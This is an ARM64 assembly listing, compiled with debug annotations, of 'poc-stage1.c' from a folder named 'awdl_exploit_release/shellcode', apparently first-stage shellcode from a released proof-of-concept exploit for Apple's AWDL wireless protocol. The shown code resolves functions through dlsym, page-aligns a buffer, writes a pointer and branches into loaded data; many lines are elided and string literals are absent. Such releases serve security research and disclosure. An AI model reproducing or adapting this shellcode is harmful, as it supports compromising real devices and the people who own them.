	...
	.file	1 "/Users/xss/Downloads/awdl_exploit_release/shellcode" "poc-stage1.c"
...
_start:                                 ; @start
Lfunc_begin0:
	.loc	1 106 0                         ; poc-stage1.c:106:0
	.cfi_startproc
; %bb.0:
	...
	str	x2, [sp, #952]
Ltmp0:
	.loc	1 0 0 prologue_end              ; poc-stage1.c:0:0
	adrp	x8, __dlsym@PAGE
	str	x8, [sp, #64]                   ; 8-byte Folded Spill
	.loc	1 107 5                         ; poc-stage1.c:107:5
	ldr	x8, [x8, __dlsym@PAGEOFF]
	mov	x0, #-2
	str	x0, [sp, #72]                   ; 8-byte Folded Spill
	.loc	1 0 0 is_stmt 0                 ; poc-stage1.c:0:0
	adrp	x1, l_.str@PAGE
	...
	.loc	1 112 5 is_stmt 1               ; poc-stage1.c:112:5
	ldr	x8, [x8, __dlsym@PAGEOFF]
	.loc	1 0 0 is_stmt 0                 ; poc-stage1.c:0:0
	adrp	x1, l_.str.2@PAGE
	add	x1, x1, l_.str.2@PAGEOFF
	.loc	1 112 5                         ; poc-stage1.c:112:5
	blr	x8
	mov	x8, x0
	ldr	w0, [sp, #972]
	.loc	1 0 0                           ; poc-stage1.c:0:0
	...
	ldr	x8, [sp, #64]                   ; 8-byte Folded Reload
	ldr	x0, [sp, #72]                   ; 8-byte Folded Reload
	.loc	1 114 5 is_stmt 1               ; poc-stage1.c:114:5
	ldr	x8, [x8, __dlsym@PAGEOFF]
	blr	x8
	...
	.loc	1 114 5                         ; poc-stage1.c:114:5
	blr	x8
	ldr	x8, [sp, #64]                   ; 8-byte Folded Reload
	ldr	x0, [sp, #72]                   ; 8-byte Folded Reload
	.loc	1 117 30 is_stmt 1              ; poc-stage1.c:117:30
	ldr	w9, [sp, #148]
	.loc	1 117 46 is_stmt 0              ; poc-stage1.c:117:46
	lsl	w9, w9, #10
	.loc	1 117 14                        ; poc-stage1.c:117:14
	str	w9, [sp, #124]
	.loc	1 120 16 is_stmt 1              ; poc-stage1.c:120:16
	ldr	w9, [sp, #124]
	mov	w10, #16383
	add	w9, w9, w10
	str	w9, [sp, #124]
	.loc	1 121 16                        ; poc-stage1.c:121:16
	ldr	w9, [sp, #124]
	and	w9, w9, #0xffffc000
	str	w9, [sp, #124]
	.loc	1 125 24                        ; poc-stage1.c:125:24
	ldr	x8, [x8, __dlsym@PAGEOFF]
	.loc	1 0 0 is_stmt 0                 ; poc-stage1.c:0:0
	...
	mov	x9, x0
	ldr	x0, [sp, #72]                   ; 8-byte Folded Reload
	.loc	1 125 17                        ; poc-stage1.c:125:17
	str	w9, [sp, #108]
	.loc	1 126 5 is_stmt 1               ; poc-stage1.c:126:5
	ldr	x8, [x8, __dlsym@PAGEOFF]
	.loc	1 0 0 is_stmt 0                 ; poc-stage1.c:0:0
	adrp	x1, l_.str.5@PAGE
	add	x1, x1, l_.str.5@PAGEOFF
	.loc	1 126 5                         ; poc-stage1.c:126:5
	blr	x8
	mov	x8, x0
	ldr	w0, [sp, #108]
	ldr	w9, [sp, #124]
	...
	blr	x8
Ltmp1:
	.loc	1 129 19 is_stmt 1              ; poc-stage1.c:129:19
	str	wzr, [sp, #104]
LBB0_1:                                 ; =>This Inner Loop Header: Depth=1
Ltmp2:
	.loc	1 129 26 is_stmt 0              ; poc-stage1.c:129:26
	ldr	w8, [sp, #104]
	.loc	1 129 33                        ; poc-stage1.c:129:33
	ldr	w9, [sp, #148]
Ltmp3:
	.loc	1 129 5                         ; poc-stage1.c:129:5
	subs	w8, w8, w9
	b.hs	LBB0_4
Ltmp4:
; %bb.2:                                ;   in Loop: Header=BB0_1 Depth=1
	...
	adrp	x8, __dlsym@PAGE
Ltmp5:
	.loc	1 130 9 is_stmt 1               ; poc-stage1.c:130:9
	ldr	x8, [x8, __dlsym@PAGEOFF]
	mov	x0, #-2
Ltmp6:
	.loc	1 0 0 is_stmt 0                 ; poc-stage1.c:0:0
	...
	add	x1, x1, l_.str.2@PAGEOFF
Ltmp7:
	.loc	1 130 9                         ; poc-stage1.c:130:9
	blr	x8
	mov	x8, x0
	ldr	w0, [sp, #972]
	add	x9, sp, #136                    ; =136
...
; %bb.3:                                ;   in Loop: Header=BB0_1 Depth=1
	.loc	1 129 52 is_stmt 1              ; poc-stage1.c:129:52
	ldr	w8, [sp, #104]
	add	w8, w8, #1                      ; =1
	str	w8, [sp, #104]
	.loc	1 129 5 is_stmt 0               ; poc-stage1.c:129:5
	b	LBB0_1
Ltmp9:
LBB0_4:
	.loc	1 0 5                           ; poc-stage1.c:0:5
	add	x8, sp, #96                     ; =96
	...
	movk	x8, #1686, lsl #48
	.loc	1 134 14 is_stmt 1              ; poc-stage1.c:134:14
	str	x8, [sp, #96]
	.loc	1 0 0 is_stmt 0                 ; poc-stage1.c:0:0
	adrp	x8, __dlsym@PAGE
	str	x8, [sp, #24]                   ; 8-byte Folded Spill
	.loc	1 135 44 is_stmt 1              ; poc-stage1.c:135:44
	ldr	x8, [x8, __dlsym@PAGEOFF]
	mov	x0, #-2
	...
	.loc	1 135 44                        ; poc-stage1.c:135:44
	blr	x8
	...
	.loc	1 135 24                        ; poc-stage1.c:135:24
	str	x9, [sp, #88]
	.loc	1 136 5 is_stmt 1               ; poc-stage1.c:136:5
	ldr	x8, [x8, __dlsym@PAGEOFF]
	.loc	1 0 0 is_stmt 0                 ; poc-stage1.c:0:0
	adrp	x1, l_.str@PAGE
	add	x1, x1, l_.str@PAGEOFF
	.loc	1 136 5                         ; poc-stage1.c:136:5
	blr	x8
	mov	x8, x0
	ldr	x9, [sp, #88]
	mov	x1, #0
	...
	ldr	x8, [sp, #24]                   ; 8-byte Folded Reload
	ldr	x0, [sp, #32]                   ; 8-byte Folded Reload
	.loc	1 137 26 is_stmt 1              ; poc-stage1.c:137:26
	ldr	x9, [x8, __dlsym@PAGEOFF]
	.loc	1 137 6 is_stmt 0               ; poc-stage1.c:137:6
	ldr	x10, [sp, #88]
	.loc	1 137 24                        ; poc-stage1.c:137:24
	str	x9, [x10]
	.loc	1 140 5 is_stmt 1               ; poc-stage1.c:140:5
	ldr	x8, [x8, __dlsym@PAGEOFF]
	.loc	1 0 0 is_stmt 0                 ; poc-stage1.c:0:0
	adrp	x1, l_.str.8@PAGE
	add	x1, x1, l_.str.8@PAGEOFF
	.loc	1 140 5                         ; poc-stage1.c:140:5
	blr	x8
	mov	x8, x0
	ldr	w0, [sp, #108]
	ldr	x1, [sp, #112]
	...
	mov	w4, #5
	blr	x8
	.loc	1 143 42 is_stmt 1              ; poc-stage1.c:143:42
	ldr	x8, [sp, #112]
	.loc	1 143 12 is_stmt 0              ; poc-stage1.c:143:12
	str	x8, [sp, #80]
	.loc	1 144 5 is_stmt 1               ; poc-stage1.c:144:5
	ldr	x8, [sp, #80]
	.loc	1 144 12 is_stmt 0              ; poc-stage1.c:144:12
	ldr	w0, [sp, #972]
	.loc	1 0 0                           ; poc-stage1.c:0:0
	adrp	x9, _kdata@PAGE
	.loc	1 144 18                        ; poc-stage1.c:144:18
	ldr	x1, [x9, _kdata@PAGEOFF]
	.loc	1 144 5                         ; poc-stage1.c:144:5
	blr	x8
	.loc	1 145 1 is_stmt 1               ; poc-stage1.c:145:1
	add	sp, sp, #976                    ; =976
...
_main:                                  ; @main
Lfunc_begin1:
	.loc	1 150 0                         ; poc-stage1.c:150:0
	.cfi_startproc
; %bb.0:
	sub	sp, sp, #304                    ; =304
...
Ltmp12:
	...
	str	x1, [sp, #224]
Ltmp13:
	.loc	1 153 10                        ; poc-stage1.c:153:10
	str	x8, [sp, #208]
	strb	wzr, [sp, #207]
Ltmp14:
	.loc	1 153 10 is_stmt 0              ; poc-stage1.c:153:10
	ldr	x0, [sp, #208]
	ldrb	w1, [sp, #207]
...
Ltmp17:
LBB1_2:
	.loc	1 0 10                          ; poc-stage1.c:0:10
	ldr	x8, [sp, #112]                  ; 8-byte Folded Reload
Ltmp18:
	.loc	1 154 10 is_stmt 1              ; poc-stage1.c:154:10
	str	x8, [sp, #184]
	mov	w8, #1
	strb	w8, [sp, #183]
Ltmp19:
	.loc	1 154 10 is_stmt 0              ; poc-stage1.c:154:10
	ldr	x0, [sp, #184]
	ldrb	w1, [sp, #183]
	bl	_os_log_type_enabled
Ltmp20:
	.loc	1 154 10                        ; poc-stage1.c:154:10
	tbz	w0, #0, LBB1_4
; %bb.3:
Ltmp21:
	.loc	1 154 10                        ; poc-stage1.c:154:10
...
LBB1_4:
	...
	ldr	x8, [sp, #112]                  ; 8-byte Folded Reload
Ltmp23:
	.loc	1 155 10 is_stmt 1              ; poc-stage1.c:155:10
	str	x8, [sp, #168]
	mov	w8, #2
	strb	w8, [sp, #167]
Ltmp24:
	.loc	1 155 10 is_stmt 0              ; poc-stage1.c:155:10
	ldr	x0, [sp, #168]
	ldrb	w1, [sp, #167]
	bl	_os_log_type_enabled
Ltmp25:
	.loc	1 155 10                        ; poc-stage1.c:155:10
	tbz	w0, #0, LBB1_6
; %bb.5:
Ltmp26:
	.loc	1 155 10                        ; poc-stage1.c:155:10
...
Ltmp27:
LBB1_6:
	.loc	1 157 40 is_stmt 1              ; poc-stage1.c:157:40
	ldr	w0, [sp, #220]
	.loc	1 157 31 is_stmt 0              ; poc-stage1.c:157:31
	bl	_getpwuid
	.loc	1 157 25                        ; poc-stage1.c:157:25
	str	x0, [sp, #152]
Ltmp28:
	.loc	1 158 14 is_stmt 1              ; poc-stage1.c:158:14
	ldr	x8, [sp, #152]
Ltmp29:
	.loc	1 158 14 is_stmt 0              ; poc-stage1.c:158:14
	cbnz	x8, LBB1_10
; %bb.7:
Ltmp30:
	.loc	1 160 24 is_stmt 1              ; poc-stage1.c:160:24
	bl	___error
	ldr	x8, [sp, #112]                  ; 8-byte Folded Reload
	ldr	w9, [x0]
	.loc	1 160 18 is_stmt 0              ; poc-stage1.c:160:18
	str	w9, [sp, #148]
Ltmp31:
	.loc	1 161 14 is_stmt 1              ; poc-stage1.c:161:14
	str	x8, [sp, #136]
	mov	w8, #16
	strb	w8, [sp, #135]
Ltmp32:
	.loc	1 161 14 is_stmt 0              ; poc-stage1.c:161:14
	ldr	x0, [sp, #136]
	ldrb	w1, [sp, #135]
	bl	_os_log_type_enabled
Ltmp33:
	.loc	1 161 14                        ; poc-stage1.c:161:14
	tbz	w0, #0, LBB1_9
; %bb.8:
Ltmp34:
	.loc	1 161 14                        ; poc-stage1.c:161:14
...
Ltmp35:
LBB1_9:
	.loc	1 163 21 is_stmt 1              ; poc-stage1.c:163:21
	ldr	w8, [sp, #148]
	.loc	1 163 14 is_stmt 0              ; poc-stage1.c:163:14
	str	w8, [sp, #236]
	b	LBB1_11
Ltmp36:
LBB1_10:
	.loc	1 0 0                           ; poc-stage1.c:0:0
	adrp	x8, __dlsym@PAGE
	.loc	1 166 5 is_stmt 1               ; poc-stage1.c:166:5
	ldr	x8, [x8, __dlsym@PAGEOFF]
	mov	x0, #-2
	.loc	1 0 0 is_stmt 0                 ; poc-stage1.c:0:0
	adrp	x1, l_.str.9@PAGE
	add	x1, x1, l_.str.9@PAGEOFF
	.loc	1 166 5                         ; poc-stage1.c:166:5
	blr	x8
	mov	x8, x0
	.loc	1 0 0                           ; poc-stage1.c:0:0
	...
	mov	w0, #0
	mov	x2, #0
	.loc	1 167 5 is_stmt 1               ; poc-stage1.c:167:5
	mov	x1, x2
	bl	_start
	mov	w8, #42
	.loc	1 168 5                         ; poc-stage1.c:168:5
	str	w8, [sp, #236]
Ltmp37:
LBB1_11:
	.loc	1 170 6                         ; poc-stage1.c:170:6
	ldr	w8, [sp, #236]
	...
	b.ne	LBB1_13
; %bb.12:
	.loc	1 0 6 is_stmt 0                 ; poc-stage1.c:0:6
...
Lfunc_begin2:
	.loc	1 0 0 is_stmt 1                 ; poc-stage1.c:0:0
	.cfi_startproc
; %bb.0:
	sub	sp, sp, #16                     ; =16
...
Linfo_string:
	...
	.asciz	"poc-stage1.c"                    ; string offset=47
